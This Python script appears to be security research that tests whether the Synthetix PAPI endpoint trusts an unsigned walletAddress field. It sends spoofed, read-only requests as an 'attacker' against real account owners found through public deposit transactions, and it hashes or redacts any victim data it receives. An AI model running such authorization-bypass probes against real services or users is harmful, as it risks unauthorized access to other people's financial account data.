#!/usr/bin/env python3
"""Controlled read-only probe for unsigned request identity fields in Synthetix PAPI.

The signed SubAccountAction contains subAccountId, action and expiresAfter, but
walletAddress is an unsigned request field. This probe checks whether the server
binds authorization to the recovered signer rather than trusting walletAddress,
and whether action/account mismatches are rejected.

Only account-query actions are used. No raw victim wallet, account ID, balance,
position, order or response value is written to disk.
"""

from __future__ import annotations

import hashlib
import json
import pathlib
import re
import sys
import time
from typing import Any

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
import synthetix_read_auth_boundary as base  # noqa: E402

OUT = pathlib.Path("unsigned_identity_probe")
OUT.mkdir(parents=True, exist_ok=True)


def digest(value: str) -> str:
    return hashlib.sha256(value.encode()).hexdigest()


def redact(value: Any) -> str | None:
    if value is None:
        return None
    text = str(value)
    text = re.sub(r"0x[a-fA-F0-9]{40}", "<address>", text)
    text = re.sub(r"0x[a-fA-F0-9]{2,12}\.\.\.[a-fA-F0-9]{2,12}", "<short-address>", text)
    text = re.sub(r"0x[a-fA-F0-9]{64,}", "<hex>", text)
    text = re.sub(r"\b\d{6,}\b", "<number>", text)
    return text[:300]


def schema(value: Any, depth: int = 0) -> Any:
    if depth >= 3:
        return type(value).__name__
    if isinstance(value, dict):
        return {str(key): schema(val, depth + 1) for key, val in sorted(value.items())}
    if isinstance(value, list):
        return {
            "type": "list",
            "count": len(value),
            "sample_schema": schema(value[0], depth + 1) if value else None,
        }
    return type(value).__name__


def summarize(name: str, status: int, body: bytes, metadata: dict[str, Any]) -> dict[str, Any]:
    data = base.parse_json(body)
    success = bool(status == 200 and isinstance(data, dict) and data.get("status") == "ok")
    error = data.get("error") if isinstance(data, dict) else None
    error_code = error.get("code") if isinstance(error, dict) else None
    error_message = error.get("message") if isinstance(error, dict) else error
    return {
        "name": name,
        **metadata,
        "http_status": status,
        "api_success": success,
        "error_code": error_code,
        "error_message_redacted": redact(error_message),
        "error_message_sha256": digest(str(error_message)) if error_message is not None else None,
        "body_sha256": hashlib.sha256(body).hexdigest(),
        "body_bytes": len(body),
        "response_schema": schema(data.get("response")) if success and isinstance(data, dict) else None,
    }


def discover_targets(limit: int = 2) -> list[dict[str, str]]:
    targets: list[dict[str, str]] = []
    seen_ids: set[str] = set()
    for tx_hash in base.DEPOSIT_TX_HASHES:
        event = base.event_from_receipt(tx_hash)
        if not event:
            continue
        ids = base.account_ids(event["beneficiary"])
        for account_id in ids["owned"]:
            if account_id in seen_ids:
                continue
            seen_ids.add(account_id)
            targets.append(
                {
                    "owner": event["beneficiary"],
                    "account_id": account_id,
                    "owner_sha256": digest(event["beneficiary"].lower()),
                    "account_id_sha256": digest(account_id),
                }
            )
            if len(targets) >= limit:
                return targets
        time.sleep(0.35)
    return targets


def request_case(
    *,
    name: str,
    signed_account_id: str,
    requested_account_id: str,
    signed_action: str,
    requested_action: str,
    params_wallet: str | None,
    top_wallet: str | None = None,
    extra_params: dict[str, Any] | None = None,
) -> dict[str, Any]:
    expires_after = int(time.time() * 1000) + 120_000
    params: dict[str, Any] = {
        "action": requested_action,
        "subAccountId": requested_account_id,
    }
    if params_wallet is not None:
        params["walletAddress"] = params_wallet
    if extra_params:
        params.update(extra_params)

    payload: dict[str, Any] = {
        "params": params,
        "signature": base.sign_action(signed_account_id, signed_action, expires_after),
        "expiresAfter": expires_after,
    }
    if top_wallet is not None:
        payload["walletAddress"] = top_wallet

    status, body = base.post_json(base.PAPI_TRADE, payload)
    metadata = {
        "signed_action_equals_requested_action": signed_action == requested_action,
        "signed_account_equals_requested_account": signed_account_id == requested_account_id,
        "params_wallet_mode": (
            "omitted"
            if params_wallet is None
            else "attacker"
            if params_wallet.lower() == base.ATTACKER.address.lower()
            else "victim"
        ),
        "top_wallet_mode": (
            "omitted"
            if top_wallet is None
            else "attacker"
            if top_wallet.lower() == base.ATTACKER.address.lower()
            else "victim"
        ),
    }
    return summarize(name, status, body, metadata)


def main() -> None:
    summary: dict[str, Any]
    try:
        targets = discover_targets(limit=2)
        if len(targets) < 2:
            raise RuntimeError("fewer than two public owner/account pairs were available")

        first, second = targets[0], targets[1]
        cases: list[dict[str, Any]] = []

        # Baseline: recovered attacker signer and honest attacker walletAddress.
        cases.append(
            request_case(
                name="baseline_foreign_signer_honest_wallet",
                signed_account_id=first["account_id"],
                requested_account_id=first["account_id"],
                signed_action="getSubAccount",
                requested_action="getSubAccount",
                params_wallet=base.ATTACKER.address,
            )
        )
        time.sleep(0.7)

        # Main wedge: walletAddress is not part of the signed EIP-712 message.
        for target_index, target in enumerate((first, second), start=1):
            cases.append(
                request_case(
                    name=f"victim_{target_index}_spoofed_params_wallet",
                    signed_account_id=target["account_id"],
                    requested_account_id=target["account_id"],
                    signed_action="getSubAccount",
                    requested_action="getSubAccount",
                    params_wallet=target["owner"],
                )
            )
            time.sleep(0.7)

        # Determine whether omitting walletAddress changes identity recovery.
        cases.append(
            request_case(
                name="omitted_params_wallet",
                signed_account_id=first["account_id"],
                requested_account_id=first["account_id"],
                signed_action="getSubAccount",
                requested_action="getSubAccount",
                params_wallet=None,
            )
        )
        time.sleep(0.7)

        # Check top-level/params precedence without changing the signed message.
        cases.append(
            request_case(
                name="victim_top_wallet_attacker_params_wallet",
                signed_account_id=first["account_id"],
                requested_account_id=first["account_id"],
                signed_action="getSubAccount",
                requested_action="getSubAccount",
                params_wallet=base.ATTACKER.address,
                top_wallet=first["owner"],
            )
        )
        time.sleep(0.7)
        cases.append(
            request_case(
                name="attacker_top_wallet_victim_params_wallet",
                signed_account_id=first["account_id"],
                requested_account_id=first["account_id"],
                signed_action="getSubAccount",
                requested_action="getSubAccount",
                params_wallet=first["owner"],
                top_wallet=base.ATTACKER.address,
            )
        )
        time.sleep(0.7)

        # Cross-action binding: sign one query, request another query.
        cases.append(
            request_case(
                name="signed_get_subaccount_requested_delegated_signers",
                signed_account_id=first["account_id"],
                requested_account_id=first["account_id"],
                signed_action="getSubAccount",
                requested_action="getDelegatedSigners",
                params_wallet=first["owner"],
            )
        )
        time.sleep(0.7)

        # Cross-account binding: sign account A, request account B.
        cases.append(
            request_case(
                name="signed_account_one_requested_account_two",
                signed_account_id=first["account_id"],
                requested_account_id=second["account_id"],
                signed_action="getSubAccount",
                requested_action="getSubAccount",
                params_wallet=second["owner"],
            )
        )
        time.sleep(0.7)

        # A second read action with victim wallet spoofing provides a negative control
        # against endpoint-specific behavior.
        cases.append(
            request_case(
                name="spoofed_wallet_get_withdrawable_amounts",
                signed_account_id=first["account_id"],
                requested_account_id=first["account_id"],
                signed_action="getWithdrawableAmounts",
                requested_action="getWithdrawableAmounts",
                params_wallet=first["owner"],
                extra_params={"symbols": ["USDT", "WETH"]},
            )
        )

        unexpected = [case["name"] for case in cases if case["api_success"]]
        summary = {
            "safety": "Read-only actions only; no raw victim identity or account data retained.",
            "attacker_address": base.ATTACKER.address,
            "target_hashes": [
                {
                    "owner_sha256": target["owner_sha256"],
                    "account_id_sha256": target["account_id_sha256"],
                }
                for target in targets
            ],
            "cases": cases,
            "unexpected_successes": unexpected,
            "unexpected_authorization_success": bool(unexpected),
        }
    except BaseException as exc:  # noqa: BLE001
        summary = {
            "safety": "No state-changing request was issued; no raw victim identity retained.",
            "probe_completed": False,
            "failure_type": type(exc).__name__,
            "failure_message_redacted": redact(exc),
            "failure_message_sha256": digest(str(exc)),
            "unexpected_authorization_success": False,
        }

    (OUT / "summary.json").write_text(json.dumps(summary, indent=2), encoding="utf-8")
    print(json.dumps(summary, indent=2))


if __name__ == "__main__":
    main()
